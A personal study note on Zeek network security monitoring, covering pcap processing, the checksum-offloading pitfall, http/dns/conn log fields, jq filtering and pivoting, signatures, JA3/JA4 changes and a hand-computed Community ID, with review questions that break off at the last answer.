About this page

A personal study note, rewritten in my own words from several learning resources. The syslog bridge and experiments are my own; apart from the public sample, the scenarios are hypothetical.

docs.title: 2.8 — Zeek: Network Security Monitoring, Log Structure, jq, Community ID
2.8 — Zeek: Network Security Monitoring, Log Structure, jq, Community ID
docs.text:
Scope of this lesson

  • What network security monitoring (NSM) is and how it differs from an IDS
  • Processing pcaps with Zeek: -r, policies, and [Caution] the trap where checksum offloading makes whole logs disappear
  • Log file types, common fields and http.log fields; [Correction] the password field is empty by default
  • TSV and JSON, zeek-cut and jq: filtering, projecting, converting timestamps, handling arrays, pivoting between logs with uid
  • jq performance: narrow first with grep
  • Signatures and scripts; [Changed] from JA3 to JA4
  • Community ID: a flow identifier that works across tools, computed by hand
  • Building your own Zeek policy for investigations

Lab environment and notation

(Actual output) came from Zeek 9.0.1 (the official Docker image zeek/zeek), jq 1.7 and TShark 4.2.2 in this environment. The pcap analysed is practice traffic I generated on loopback: HTTP requests to lesson 2.5's Apache practice server (www.lab.example, port 8080), queries to lesson 2.6's practice DNS hierarchy, and a TLS connection to lesson 2.7's practice DoH server (127.0.0.20). That's why HTTP source and destination both appear as 127.0.0.1. The Basic auth account and password are practice values. The jq speed comparison used a fake dns.log of 1.5 million random lines.

docs.title: 1. Network security monitoring and Zeek
docs.text:
Blocking was once the top priority. Intrusion detection systems (IDS) and intrusion prevention systems (IPS) were expected to catch and stop bad behaviour. Eventually came the realisation that prevention will fail sooner or later, and then you need investigations built on solid evidence.

Network security monitoring (NSM) grew out of that realisation. It collects evidence before an incident is discovered, creating an environment ready to support an investigation — a "forensically ready" environment. It turns the traditional idea of a "defensible network" into "a network prepared for the investigation that will inevitably come", in parallel with IDSes and IPSes evolving to absorb NSM features. Today's NSM concepts owe much to Richard Bejtlich's books The Tao of Network Security Monitoring and The Practice of Network Security Monitoring.

As an analogy, an IDS is a burglar alarm and NSM a dashcam. An alarm sounds when a predefined thing happens and records nothing otherwise. A dashcam keeps recording whatever happens and answers "what happened back then?" later. Where it breaks: a dashcam keeps the full video, but Zeek doesn't keep packets in full; it keeps protocol-aware summaries (logs). They're much smaller and easier to search, but details it didn't log simply aren't there (the "full packets versus summaries" trade-off from lesson 1.10).

Zeek (formerly Bro) is the flagship NSM tool.

  • Different goals. Where a traditional IDS focuses on content monitoring and alert management, Zeek's developers prioritise traffic visibility and application-layer understanding across many protocols. You can add signatures (section 7), but that's not its main use in an investigator's daily work.
  • Free and open source, with commercial support from Corelight and an active user community.
  • Live and pcap processing work the same way. Real-time monitoring that feeds a SIEM and forensic processing of existing pcaps can share one workflow. Teams also deploy Zeek tactically in front of a compromised system or segment to boost visibility.
  • Extensible and scalable: standard analysers cover much of what investigations meet, scripts add functionality, and clustered deployments have handled 100 Gb/s.
  • Layer-7 session awareness: one log line holds both the request and its response (as with the query and answer on one line in lesson 2.7's dns.log), making analysis much easier than with repurposed tools.

Many NSM platforms use Zeek alone or as part of a larger suite; Security Onion is a popular example.

docs.title: 2. Processing a pcap with Zeek
docs.text:
Live configuration is out of scope here, but processing an existing pcap is easy. Give the input file with -r and log files appear in the directory you ran it from.

zeek -r lab.pcap                 # base scripts only
zeek -r lab.pcap local           # plus the site policy (site/local.zeek)
zeek -r lab.pcap forensic.zeek   # a policy file of your own (section 10)

The name at the end is a script (policy) to load as well. With nothing there, only the base scripts run. In this lab's official image, local is /usr/local/zeek/share/zeek/site/local.zeek.

docs.title: 2.1 [Caution] Checksum offloading: whole logs disappear
docs.text:
I ran the practice pcap with no options.

(Actual output)

$ zeek -r lab.pcap
warning in .../base/misc/find-checksum-offloading.zeek, line 54: Your trace file likely has
invalid TCP and UDP checksums, most likely from NIC checksum offloading.  By default, packets
with invalid checksums are discarded by Zeek unless using the -C command-line option or
toggling the 'ignore_checksums' variable. ...
$ ls
conn.log  packet_filter.log  reporter.log  weird.log

No http.log and no dns.log. weird.log recorded bad_TCP_checksum and bad_UDP_checksum. Running the same pcap again with -C:

$ zeek -C -r lab.pcap
$ ls
conn.log  dns.log  files.log  http.log  packet_filter.log  ssl.log

What happened? Modern operating systems hand checksum calculation to the network card (checksum offloading). When you capture on the sending machine itself, packets are saved before the checksum is filled in, so they look wrong. This pcap was captured on loopback, and 28 of its 94 packets were like that (checked with TShark). Zeek discards packets with bad checksums by default, so the packets needed for application-layer analysis vanished and the HTTP and DNS logs were never created.

What this means for investigations: you can't expect every forensic pcap to come from a device without offloading. When processing evidence pcaps, use -C (or ignore_checksums = T) by default, and always check weird.log and reporter.log before concluding "there's no HTTP in this pcap". Conversely, many checksum errors on a live sensor (fed by SPAN or a TAP) may mean genuinely damaged or crafted packets, which is a clue in itself.

docs.title: 3. Log file types and formats
docs.text:
Zeek doesn't write one unified log; it writes dozens of log files depending on the traffic observed. If there was no SSL/TLS in a time window, ssl.log and x509.log simply don't exist for it. Added functionality can create new logs or add fields to existing ones.

Category Log Contents Network protocols conn.log TCP/UDP/ICMP connections (similar to NetFlow, lesson 1.10) dns.log DNS activity (the same content as passive DNS, lesson 2.7) http.log HTTP activity ssl.log TLS negotiation (server name, version, cipher) rdp.log, smtp.log, ssh.log Activity for each protocol File metadata files.log File analysis (hashes, MIME type, etc.). For some protocols Zeek can extract full file content smb_files.log Files moved over SMB x509.log Certificate information pe.log Windows executables (PE) Inventories built by observation known_hosts.log, known_services.log, software.log Observed systems, services and software Special cases signatures.log Signature hits (section 7) weird.log Unexpected protocol observations (such as the checksum errors in 2.1) intel.log Intelligence framework hits notice.log Potentially concerning observations (certificate validation errors, brute force, etc.)

[Supplement] \"Rotates logs every hour on the hour\" is about operational sensors

The book says Zeek archives and compresses logs every hour on the hour by default. That's the default for live sensors run with ZeekControl or as a cluster. When you process a pcap with zeek -r, as here, there's no rotation, just one file per log (printing Log::default_rotation_interval in Zeek 9.0.1 gave 0 secs). When investigating logs from an operational sensor, you'll need several hourly files such as conn.20:00:00-21:00:00.log.gz to see the full picture.

docs.title: 3.1 TSV and JSON
docs.text:
Tab-separated values (TSV) was historically the default, and TSV is still the default (in Zeek 9.0.1, LogAscii::use_json is F). But the move to JSON logging reached Zeek too, and in practice you'll meet JSON logs very often.

TSV logs carry format information in a header.

(Actual output; part of the http.log header)

#separator \x09
#set_separator  ,
#empty_field    (empty)
#unset_field    -
#path   http
#fields ts  uid id.orig_h   id.orig_p   id.resp_h   id.resp_p   trans_depth method  host    uri referrer    ...
#types  time    string  addr    port    addr    port    count   string  string  string  string  ...

To pull columns from TSV, use zeek-cut. It selects by name, not column number, so it's safe across versions with different column orders. -d converts timestamps to a human-readable form.

(Actual output)

$ zeek-cut -d ts uid method host uri status_code < http.log
2026-11-05T07:36:46+0000    CpYAlK2BmtOQIQBL0c  GET www.lab.example /   200
2026-11-05T07:36:46+0000    CpYAlK2BmtOQIQBL0c  GET www.lab.example /notes.txt  200
2026-11-05T07:36:46+0000    CpYAlK2BmtOQIQBL0c  GET www.lab.example /report.zip 200
2026-11-05T07:36:46+0000    CqNOtq2Enp8yKk3sE8  GET www.lab.example /admin/ 401

For JSON, pass LogAscii::use_json=T. The rest of this lesson uses JSON.

zeek -C -r lab.pcap local policy/protocols/conn/community-id-logging LogAscii::use_json=T

docs.title: 4. Reading the fields
docs.text:
JSON logs are, to an extent, self-describing. Learning Zeek's naming takes time, but the core is simple: some fields appear in most logs, and the rest vary by log (and can be changed by configuration).

Common fields

Field Meaning ts When the first packet of the exchange was seen; Unix epoch with microseconds uid The connection's unique ID. A great pivot for grouping several HTTP requests in one connection (Keep-Alive) and crossing between log files id A superfield holding the connection's four endpoint values. In JSON it's flattened into id.orig_h (originating address), id.orig_p (originating port), id.resp_h (responding address) and id.resp_p (responding port)

orig (originator) is the side that started the connection; resp (responder) is the side that answered. It's about "who connected first", not "source and destination". For connectionless traffic like UDP, Zeek infers it from the first packet and the ports.

http.log fields (one line from the practice pcap, Actual output)

$ jq 'select(.uri=="/report.zip")' http.log
{
  "ts": 1793864206.74854,
  "uid": "CAU56U3BuXGG04UEil",
  "id.orig_h": "127.0.0.1",
  "id.orig_p": 33246,
  "id.resp_h": "127.0.0.1",
  "id.resp_p": 8080,
  "trans_depth": 3,
  "method": "GET",
  "host": "www.lab.example",
  "uri": "/report.zip",
  "version": "1.1",
  "user_agent": "curl/8.5.0",
  "request_body_len": 0,
  "response_body_len": 46,
  "status_code": 200,
  "status_msg": "OK",
  "tags": [],
  "resp_fuids": [ "FMxNrn1TAZX9SSFI3f" ],
  "resp_mime_types": [ "application/zip" ]
}
Field Meaning trans_depth Which request/response this is within the connection. This line is 3: the third after / and /notes.txt on the same connection method, host, uri Request method, Host header, request path referrer The Referer header. Zeek's developers chose the correct spelling rather than the standard's typo (Referer) user_agent The User-Agent header request_body_len, response_body_len Uncompressed body sizes sent by client and server status_code, status_msg Response code and phrase info_code, info_msg Last 1xx response seen filename File name from the response's Content-Disposition header tags Indicators of various attributes of the request/response username, password Basic auth username and password (see [Correction] below) proxied Headers that may indicate the request was proxied orig_fuids, resp_fuids Unique IDs of files in the request/response; link to files.log orig_mime_types, resp_mime_types MIME types of those files (determined by Zeek from the content)

I also confirmed that user_agent is recorded per request within one connection (same uid): the first request said LabBrowser/1.0, the other two curl/8.5.0 (I changed only the first on purpose). It's a per-request record, not per-connection.

[Correction] The password field is empty by default

The book introduces password as "the password if Basic auth is provided", but Zeek does not log passwords by default (HTTP::default_capture_password defaults to F, checked in Zeek 9.0.1). On the same pcap:

(Actual output)

default:                       {"uri":"/admin/","status_code":401,"username":"jdoe","password":null}
                               {"uri":"/admin/","status_code":200,"username":"jdoe","password":null}
HTTP::default_capture_password=T:
                               {"uri":"/admin/","status_code":401,"username":"jdoe","password":"wrong"}
                               {"uri":"/admin/","status_code":200,"username":"jdoe","password":"Lab-Practice-1"}

username is logged by default, and, like Apache in lesson 2.5, even on a 401 (failure). Turning passwords on helps investigations (which passwords were tried in a brute force?), but, like lesson 2.5's mod_log_forensic, it makes the log itself a credential-leak risk. If you must enable it, restrict retention and access tightly. It's also why an empty password column in operational sensor logs doesn't mean "there was no authentication".

[Caution] A 200 in the server log versus \"no response\" in Zeek

A POST to the practice CGI was logged by Apache as "POST /cgi-bin/search.cgi HTTP/1.1" 200 0, yet in Zeek's http.log its status_code was empty, conn.log showed resp_bytes 0, and history was ShADafF (no responder data d). curl also reported "Empty reply from server". The cause seems to be this practice CGI's behaviour, but I didn't pin it down (hypothesis). The point: a 200 in a server log isn't proof that a response actually went out, and putting network-side records (Zeek) next to server-side records (access logs) reveals differences like this.

docs.title: 5. Working with JSON logs in jq
docs.text: jq handles JSON data in general, not just Zeek. It has a huge feature set, but a handful of common uses go a long way in investigations. Every command in this section is actual output from jq 1.7 on the practice logs.

docs.title: 5.1 Pretty-printing: .
docs.text: The simplest use is to feed JSON on standard input and reprint it readably. . means "the whole input". Section 4's output is that, with a select added. For compressed logs from an operational sensor, use zcat http.20:00:00-21:00:00.log.gz | jq '.'. Add -c (compact) for one record per line.

docs.title: 5.2 Filtering and projecting: select() and { }
docs.text:
$ jq -c 'select(.host=="portal.lab.example") | {ts, uid, "id.orig_h", "id.resp_h", host, status_code}' http.log
{"ts":1793864206.769968,"uid":"CiMdK3w2miyU2zLCc","id.orig_h":"127.0.0.1","id.resp_h":"127.0.0.1","host":"portal.lab.example","status_code":null}

Piece by piece:

  • select(.host=="portal.lab.example"): pass only records whose host equals that value.
  • |: hand the result on (the same idea as a shell pipe).
  • {ts, uid, "id.orig_h", …}: build a new object with just those fields. Names containing dots, like id.orig_h, must be double-quoted; unquoted, jq reads them as "orig_h inside id".

docs.title: 5.3 Converting timestamps: |= todate
docs.text:
$ jq -c 'select(.uid=="CqGnde2epFh6bIDYyf") | .ts |= todate | {ts, uid, username, status_code}' http.log
{"ts":"2026-11-05T07:36:46Z","uid":"CqGnde2epFh6bIDYyf","username":"jdoe","status_code":401}

.ts |= todate means "replace the ts field with todate applied to its value", converting Unix time to ISO 8601 (UTC). Jumping straight to an interesting uid found in another log like this is a common workflow. Note that todate drops the fractional seconds (microseconds); keep the original value too when precise ordering matters.

docs.title: 5.4 Arrays: .answers and .answers[0]
docs.text:
$ jq -c 'select(.query=="cdn.example.com" and .answers!=null) | {uid, query, answers, TTLs}' dns.log
{"uid":"CYHFhr4EQi9PFrUR84","query":"cdn.example.com","answers":["edge.example.net"],"TTLs":[300.0]}
{"uid":"CCRnDa3WxlmQ8naShe","query":"cdn.example.com","answers":["edge.example.net","198.51.100.80"],"TTLs":[300.0,30.0]}
$ jq -c 'select(.query=="cdn.example.com" and .answers!=null) | .answers[0]' dns.log | head -1
"edge.example.net"

answers and TTLs are arrays, paired by position (edge.example.net with 300 s, 198.51.100.80 with 30 s — lesson 2.6's CNAME and A records with independent TTLs). Appending [0] returns just the first element.

There are two lines for the reason learned in lesson 2.6: the first is the answer the resolver got from the authoritative server (CNAME only), the second the answer the resolver gave to the client (CNAME plus A). This pcap contains all port-53 traffic on loopback. Always check id.orig_h to see which side a record is from.

docs.title: 5.5 Pivoting between logs: uid and fuid
docs.text:
I took the file ID for /report.zip from http.log and found that file's hashes in files.log.

$ F=$(jq -r 'select(.uri=="/report.zip") | .resp_fuids[0]' http.log); echo $F
FMxNrn1TAZX9SSFI3f
$ jq -c --arg f "$F" 'select(.fuid==$f) | {fuid, mime_type, total_bytes, md5, sha1, source, uid}' files.log
{"fuid":"FMxNrn1TAZX9SSFI3f","mime_type":"application/zip","total_bytes":46,"md5":"f4d3fed54615b950dcd351770272d341","sha1":"3d9a0375eb63d96912bf6c316f9caa6e487c40d4","source":"HTTP","uid":"CAU56U3BuXGG04UEil"}
  • -r: output strings raw, without quotes; needed when storing them in a shell variable.
  • --arg f "$F": pass the shell variable into jq as $f. Safer than pasting values into the filter text (no quoting or special-character problems).

Checking the real file on the server, md5sum gave the same f4d3fed54615b950dcd351770272d341. The uid in files.log is the connection the file travelled on; looking it up in conn.log gives the whole connection's size and state.

$ jq -c 'select(.uid=="CAU56U3BuXGG04UEil") | {uid, service, duration, orig_bytes, resp_bytes, conn_state, history}' conn.log
{"uid":"CAU56U3BuXGG04UEil","service":"http","duration":0.0016560554504394531,"orig_bytes":289,"resp_bytes":4842,"conn_state":"SF","history":"ShADadFf"}

From http.log to files.log to conn.log, I linked "which request → received which file (hash) → what that connection looked like". The conn_state (SF = normal close) and history from lesson 1.10 read just the same here.

[Caution] uid changes every time you process

Processing the same pcap twice, the same connection (source port 33246) had uid CAU56U3BuXGG04UEil the first time and CjrN3e3AePQwe77tTl the second (actual output). A uid is a key that links logs only within one processing run. When you cite a uid in a report, say which run it's from (date, Zeek version, policy), and to link with other tools or other runs, use the Community ID in section 8.

docs.title: 6. jq performance: narrow first with grep
docs.text:
Doing everything in jq alone can be much slower than combining it with other tools. That's not unique to jq; investigators should know their tools' limits and combine them with processing time in mind.

I searched a fake dns.log of 1.5 million random lines (about 31 MB gzipped) for beacon.example.org two ways.

(Actual output, fake data)

$ time (zcat big_dns.log.gz | jq -c 'select(.query=="beacon.example.org") | {ts,"id.orig_h"}' | wc -l)
6
real    0m7.916s

$ time (zgrep -F '"beacon.example.org"' big_dns.log.gz | jq -c '{ts,"id.orig_h"}' | wc -l)
6
real    0m1.780s

Same result (6 lines), and narrowing first with zgrep was about 4.4 times faster. jq has to parse every line as JSON; grep just compares characters. -F searches for a fixed string rather than a regular expression, so the dots needn't be escaped, and including the double quotes avoids matching longer names such as xbeacon.example.org.

That doesn't mean never use select(). grep doesn't know about fields: it also matches the same text in the answers column (another name's CNAME target). So "narrow broadly with grep, then filter precisely with jq's select()" is a good combination. Complex conditions are hard to express accurately as regular expressions over raw JSON, and jq offers a much richer, JSON-native search syntax. Choosing per situation is the investigator's call.

[Caution] Online jq playgrounds and OPSEC

A browser-based "playground" (jqplay.org) is a nice way to learn jq, showing the command line equivalent of what you did on the web. But it means sending case data to an uncontrolled Internet site, a significant OPSEC risk. Never paste real logs; use practice data only, or a self-hosted offline copy built from the published source. jq's own tutorial and manual are good starting points.

docs.title: 7.1 Signatures
docs.text:
Signature detection isn't Zeek's main purpose, but it has a signature engine that can be very useful in incident response.

  • Match on packet fields such as IP addresses, protocols, ports and packet size.
  • Match on raw traffic content and protocol-specific fields such as the HTTP request URI and request/response headers.
  • Evaluate files that appear in files.log by their magic values (format markers in the first bytes) or advertised MIME type.

It's not as rich in content-based detection as Snort or other pure IDSes, but combined with Zeek's broader NSM functionality it's often enough to flag important traffic during an investigation. I wrote a practice signature.

signature lab-python-tool-post {
  ip-proto == tcp
  http-request /.*cgi-bin\/search\.cgi/
  http-request-header /User-Agent: python-requests/
  event "Practice: scripted POST to search.cgi"
}

http-request matches a regular expression against the request URI, http-request-header against request headers. All conditions must match. I loaded it with -s.

(Actual output)

$ zeek -C -r lab.pcap -s lab.sig LogAscii::use_json=T
$ jq -c . signatures.log
{"ts":1793864206.769968,"uid":"C4K6n638HpgJwWWbpf","src_addr":"127.0.0.1","src_port":33276,"dst_addr":"127.0.0.1","dst_port":8080,"note":"Signatures::Sensitive_Signature","sig_id":"lab-python-tool-post","event_msg":"127.0.0.1: Practice: scripted POST to search.cgi","sub_msg":"python-requests/2.31.0"}

Both signatures.log and notice.log appeared, and sub_msg holds the matched header value. During an incident, a signature for the attacker's known (or suspected) behaviour lets you re-run old pcaps to find out when it started.

docs.title: 7.2 Scripts
docs.text:
Zeek's real power is its scripting framework. You attach processing to specific events (connection established, HTTP request, file seen, and so on) and store enrichment and lookup results in logs: looking up observed file hashes with reputation services, finding IPs whose MAC changes more often than a threshold, DNS frequency reports, TLS client fingerprints and more. This lab's software.log (inventory of observed software) comes from bundled scripts.

(Actual output; part of software.log)

{"host":"127.0.0.1","software_type":"HTTP::BROWSER","name":"<unknown browser>","unparsed_version":"Mozilla/5.0 (X11; Linux x86_64) LabBrowser/1.0"}
{"host":"127.0.0.1","host_p":8080,"software_type":"HTTP::SERVER","name":"Apache","version.major":2,"version.minor":4,"version.minor2":58,"version.addl":"Ubuntu","unparsed_version":"Apache/2.4.58 (Ubuntu)"}
{"host":"127.0.0.1","software_type":"HTTP::BROWSER","name":"python-requests","version.major":2,"version.minor":31,"version.minor2":0,"unparsed_version":"python-requests/2.31.0"}

It summarised client and server software and versions from the User-Agent and Server headers, which is handy for spotting when an unfamiliar tool (python-requests) first appeared internally. There are also public projects that use Zeek scripts to hunt adversary behaviour retrospectively (for example BZAR, which maps Zeek logs to ATT&CK techniques).

[Changed] TLS fingerprints: from JA3 to JA4

The book introduces the JA3 TLS client fingerprint, the JA3S server fingerprint and the HASSH SSH client fingerprint as add-on modules. Two things have changed.

  • They're not built in. Zeek 9.0.1's ssl.log had no ja3 or ja4 values (actual output: both null). You install them separately with the package manager (zkg).
  • JA3 has become less useful. Since early 2023, Chrome randomises the order of ClientHello extensions, so the same browser produces a different JA3 on each connection. JA4 (FoxIO, 2023) and its family (JA4S, JA4H and others), which for example sort the extension list before hashing, have become widespread. Licence terms differ across the JA4 components, so check them before commercial use.

What this means for investigations: matching JA3 values from old reports or threat intelligence against current traffic may not work for browser families. Always confirm which fingerprint method, and which version of the calculation, you're dealing with.

docs.title: 8. Community ID: a flow identifier across tools
8.1 Why it's needed
docs.text:
A long-standing problem in network investigations has been the lack of a common name for one flow. Each tool has its own ID (like Zeek's uid), and moving between tools meant matching addresses, ports and times by hand. And, as section 5.5 showed, Zeek's uid changes with every run.

Community ID, a standard developed by Christian Kreibich at Corelight, makes different tools assign the same value to the same flow. It's computed as:

version + ":" + base64( sha1( seed + source_address + destination_address + protocol + 0x00 + source_port + destination_port ) )
  • Version: only 1 is defined so far; the field allows future extension.
  • Seed: defaults to 0 (2 bytes). Change it to distinguish collection domains.
  • Addresses and ports: concatenated as bytes.
  • Protocol: the layer-4 protocol number (TCP = 6, UDP = 17) in 1 byte, followed by a 0x00 byte.
  • There are also rules ordering the addresses and ports so both directions get the same value, and ICMP type and code go in the port fields.

docs.title: 8.2 Computing it by hand and matching three tools
docs.text:
I wrote a short Python function from the specification, implementing the ordering rule as "put the smaller (address, port) first".

def community_id(saddr, daddr, proto, sport, dport, seed=0):
    s = ipaddress.ip_address(saddr).packed; d = ipaddress.ip_address(daddr).packed
    if (s, sport) > (d, dport):            # order endpoints so both directions match
        s, d, sport, dport = d, s, dport, sport
    data = struct.pack("!H", seed) + s + d + struct.pack("!BB", proto, 0) + struct.pack("!HH", sport, dport)
    return "1:" + base64.b64encode(hashlib.sha1(data).digest()).decode()

For the practice pcap's POST connection (127.0.0.1:33276 → 127.0.0.1:8080, TCP), I compared three sources.

(Actual output)

own implementation (forward)   1:agacjPK3vGloIKDtKkjCFusqawU=
own implementation (reverse)   1:agacjPK3vGloIKDtKkjCFusqawU=
own implementation (seed 1)    1:nucogqK6PevUrbNex7HDUz00Iv8=
Zeek conn.log community_id     1:agacjPK3vGloIKDtKkjCFusqawU=
TShark communityid field       1:agacjPK3vGloIKDtKkjCFusqawU=

All three tools produced the same value, reversing the direction didn't change it, and a different seed changed it completely. So you can paste an interesting connection's community_id from Zeek straight into Wireshark's or another tool's search and get the same flow. Arkime (formerly Moloch), mentioned in the book, also adds this value as metadata (communityid) at ingestion.

In TShark I enabled it like this:

$ tshark -r lab.pcap --enable-protocol communityid -Y 'tcp.srcport==33276 && tcp.flags.syn==1' \
    -T fields -e ip.src -e tcp.srcport -e ip.dst -e tcp.dstport -e communityid
127.0.0.1   33276   127.0.0.1   8080    1:agacjPK3vGloIKDtKkjCFusqawU=

In the Wireshark GUI, enable CommunityID under "Analyze > Enabled Protocols"; the value appears in packet details and you can filter with communityid == "1:…".

[Changed] Zeek now ships it

The book says Zeek needs an external module for Community ID. It's now a bundled script (since Zeek 6.0). In this lab's Zeek 9.0.1, loading policy/protocols/conn/community-id-logging was enough to add community_id to conn.log. It's not on by default, though, so load it in your policy (section 10).

[Caution] Community ID names a 5-tuple, not a connection

Time isn't part of the calculation. If the same address/port combination is reused later (source-port reuse, long captures), different connections share a value. When you find results in another tool by Community ID, match the times too to confirm it's the same connection. And across points where addresses change, such as either side of a NAT device, the same communication gets different values.

docs.title: 9. The roles of IDS and NSM
docs.text:
Once marketed as a threat-ending solution, the IDS has found a more fitting role as a monitoring device tuned to the organisation's needs without drowning administrators in alerts. It often provides the first indication that an attack is under way or has succeeded. NSM is a natural progression from rule-based IDS towards more proactive continuous monitoring, and platforms that process pcaps and live traffic the same way are especially valuable in incident response.

Both provide evidence in the form of logs. That's extremely useful for finding past activity that becomes recognisably suspicious after details about an attack or threat actor come to light. During an incident, you can write signatures for the attacker's known or suspected activity yourself and react quickly as their tactics change (section 7.1).

docs.title: 10. Building a Zeek policy for investigations
docs.text:
The book presents two course policies, but their contents are principles worth applying in any investigation. I wrote my own policy file for this lab and ran it.

# Practice policy for offline (pcap) forensic processing.
# Loads selected pieces instead of "local", so the hash lookup over DNS (detect-MHR) is not loaded.
@load frameworks/files/hash-all-files                # MD5/SHA1/SHA256 in files.log
@load protocols/conn/known-hosts                     # known_hosts.log
@load protocols/conn/known-services                  # known_services.log
@load protocols/http/software                        # software.log from HTTP headers
@load policy/protocols/conn/community-id-logging     # community_id in conn.log
redef LogAscii::use_json = T;                        # JSON logs for jq
redef ignore_checksums = T;                          # same effect as -C (offloaded checksums)
redef Site::local_nets += { 127.0.0.0/8 };           # what counts as "local" in this lab

Running zeek -r lab.pcap forensic.zeek, even without -C, produced http.log, dns.log, files.log (with SHA-256), known_hosts.log and others in JSON, with community_id in conn.log (actual output). By principle:

Principle How Why JSON logs LogAscii::use_json = T Easy to handle with jq (section 5) Ignore checksums ignore_checksums = T or -C Prevents logs vanishing on offloaded captures (section 2.1) Community ID load community-id-logging Links to other tools (section 8) File hashes hash-all-files Hashes in files.log for reputation lookups and matching other evidence Define "local" Site::local_nets Some scripts (known-hosts etc.) decide inside/outside from it. Adjust it to the environment under investigation Turn off outside lookups don't load local wholesale, or remove the script See [Caution] below File extraction separately policy/frameworks/files/extract-all-files only when needed It greatly increases storage and run time

[Caution] The default site policy asks the outside world about file hashes

This image's local.zeek loads frameworks/files/detect-MHR (checked directly). That script asks Team Cymru's Malware Hash Registry about observed file hashes via DNS queries. No files are sent, so general OPSEC constraints are met, but revealing which hashes you're investigating can be a problem, and in an analysis environment without Internet access the lookups fail and can slow processing. That's why the policy above picks pieces instead of loading local wholesale.

[Changed] The SMB analyser is now on by default

The book says the SMB analyser must be enabled in the policy. Zeek 9.0.1's default script list (base/init-default.zeek) contains @load base/protocols/smb (checked directly), so SMB traffic produces smb_files.log, smb_mapping.log and so on out of the box. That metadata is invaluable in Windows-heavy environments.

docs.title: 11. How this is used in real investigations
docs.text:
1. Process evidence pcaps with -C (or ignore_checksums). Look at weird.log and reporter.log first.
  2. Record the processing conditions. Zeek version, policy file, options. A uid is valid only within that run.
  3. JSON logs; narrow with grep, filter precisely with jq.
  4. Link logs with uid and fuid. http.log → files.log (hashes) → conn.log (sizes, state).
  5. Link to other tools with Community ID plus time.
  6. Know what empty fields mean. An empty password doesn't mean no authentication; an empty status_code may mean no response came back.
  7. Check which scripts make outside lookups. Build the policy to suit the analysis environment and OPSEC.
  8. Turn behaviour learned during the incident into signatures or scripts and re-run old pcaps.

docs.title: 12. Summary
docs.text:
• NSM is the "forensically ready" approach of collecting evidence before incidents, and Zeek is its flagship tool, prioritising visibility and application-layer understanding over alerts, and processing live traffic and pcaps the same way.
  • [Caution] Confirmed directly: a pcap with offloaded checksums run without options produced no http.log or dns.log at all; with -C they appeared.
  • Zeek writes dozens of log types depending on traffic. The default format is still TSV (select by name with zeek-cut), but JSON is common in practice. Hourly rotation is about operational sensors.
  • Common fields ts, uid, id.*. In http.log, trans_depth is the sequence within a connection and user_agent is per request. [Correction] password is empty by default (username is logged even on 401), and enabling it turns the log into a credential-leak risk.
  • jq: ., -c, select(), { } (quote dotted names), |= todate, [0], -r, --arg. I linked http.log → files.log (hash matched the real file) → conn.log.
  • On 1.5 million lines, narrowing first with zgrep was about 4.4 times faster than jq alone. Filter precisely with select().
  • A signature caught the python-requests POST, and software.log inventoried observed software. [Changed] JA3/JA4 aren't built in, and JA3 became less useful after Chrome's extension-order randomisation.
  • Community ID: my implementation, Zeek and TShark gave the same value, identical in both directions. [Changed] Zeek ships it as a bundled script. Time isn't part of it, so confirm times as well.

docs.title: Review questions
docs.text:
Question 1. (Basics) A colleague ran a pcap captured in front of a compromised server through Zeek, got only conn.log and no http.log, and reported "there was no HTTP traffic in this period". What would you check first?

Answer and explanation

First look at weird.log, reporter.log and Zeek's warning messages. If there's bad_TCP_checksum or a "checksum offloading" warning, Zeek discarded packets with bad checksums and couldn't do application-layer analysis (section 2.1's experiment lost http.log the same way). Re-run with -C (or ignore_checksums = T). Also check service and resp_p (80, 8080, 443…) in conn.log: HTTPS (443) lands in ssl.log, not http.log. And confirm the capture actually contains that server's traffic (lesson 1.11's collection points).

Question 2. (Reading fields) What can you tell from these three http.log lines (selected fields)?

{"uid":"CX1","trans_depth":1,"method":"GET","host":"files.example.com","uri":"/","status_code":200,"user_agent":"Mozilla/5.0 ..."}
{"uid":"CX1","trans_depth":2,"method":"GET","host":"files.example.com","uri":"/dl/setup.msi","status_code":200,"resp_mime_types":["application/x-dosexec"]}
{"uid":"CX1","trans_depth":3,"method":"POST","host":"files.example.com","uri":"/api/report","status_code":204,"request_body_len":48211}
Answer and explanation

Three requests happened in sequence (trans_depth 1, 2, 3) on one connection (same uid). After the first page, setup.msi was downloaded, and the MIME type Zeek determined from the content is a Windows executable (application/x-dosexec) — a sign the extension (.msi) and real content may differ, worth noting. Then about 47 KB was POSTed on the same connection, and the server replied 204 with no body. Next: use line 2's resp_fuids to get the hash from files.log, check its reputation and find other PCs that received it. Line 3's POST content isn't in the log, so look for the pcap or files.log via orig_fuids (if extraction was on). Finally, use the uid in conn.log for the whole connection's volume and duration.

Question 3. (Common misconception) "The password column in Zeek's http.log is empty throughout, so there were no Basic auth attempts against this server." What's wrong?

Answer and explanation

Zeek doesn't record passwords by default (HTTP::default_capture_password = F, the [Correction] in section 4). Judge authentication attempts by the username column, which is logged even for failed attempts (401). In section 4's experiment, with defaults both attempts showed password: null but username: jdoe. And if the traffic was HTTPS there's no http.log at all; a form login (POST body) rather than Basic auth won't appear in username either.

Question 4. (Applying jq) From conn.log (JSON), you want only connections that sent more than 1 MB outbound, with a human-readable time, the source and destination addresses and the bytes sent. Write the jq command, assuming the originator is internal.

Answer and explanation

For example: jq -c 'select(.orig_bytes != null and .orig_bytes > 1000000) | .ts |= todate | {ts, "id.orig_h", "id.resp_h", "id.resp_p", orig_bytes, resp_bytes, duration}' conn.log. Points to check: ① some records have no orig_bytes (null), so filter those first to avoid comparison errors; ② quote dotted names like id.orig_h; ③ to make "outbound" precise, add the local_orig/local_resp columns to the condition (when Site::local_nets is set correctly in the policy), or exclude destinations in internal ranges; ④ for big files, use zcat … | jq; a numeric comparison like 1 MB is hard to pre-filter with grep, so this is a case for select() (section 6).

Question 5. (Changed conditions) You processed the same pcap with Zeek yesterday and today. Searching today's results for a uid from yesterday's report finds nothing. Why, and what should you have done?

Answer and explanation

uids are generated fresh on every run (section 5.5's experiment: the same connection went from CAU56U3… to CjrN3e3…). A report should give the uid together with which run it came from (date, Zeek version, policy), and that run's logs should be preserved as evidence. To refer to the same flow independently of processing, also record the Community ID (the same 5-tuple gives the same value whenever and with whatever tool, section 8.2) plus time, addresses and ports.

Question 6. (Community ID) Searching Arkime for a suspicious connection's Community ID from Zeek returns three connections. What do you suspect, and how do you pick the right one?

Answer and explanation

